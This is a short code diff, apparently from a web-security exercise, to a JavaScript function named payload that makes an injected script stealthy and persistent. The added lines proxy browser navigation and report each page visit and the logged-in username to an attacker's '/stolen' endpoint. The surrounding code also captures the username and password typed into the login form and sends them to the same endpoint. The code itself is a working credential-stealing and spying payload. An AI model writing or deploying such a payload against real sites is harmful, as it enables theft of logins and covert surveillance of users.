@@ -28,7 +28,18 @@ function payload(attacker) {
 			// Show new HTML
 			$('html').show();
 
-			// TODO implement spying while being stealthy and persistent. Remove the alert.
+			window.onpopstate = function(event) {
+				proxy(document.location.href.split('.edu')[1], attacker);
+			}
+
+			var username = $("#logged-in-user").text();
+			if (user) {
+				$.get(spying_url + '/stolen', {event: 'nav', user: username, url: href});
+			}
+			else {
+				$.get(spying_url + '/stolen', {event: 'nav', url: href});
+			}
+
 			$('#log-in-btn').click(function(event) {
 				event.preventDefault();
 				$.get(spying_url + '/stolen', {event: 'login', user: $('#username').val(), pass: $('#userpass').val()});
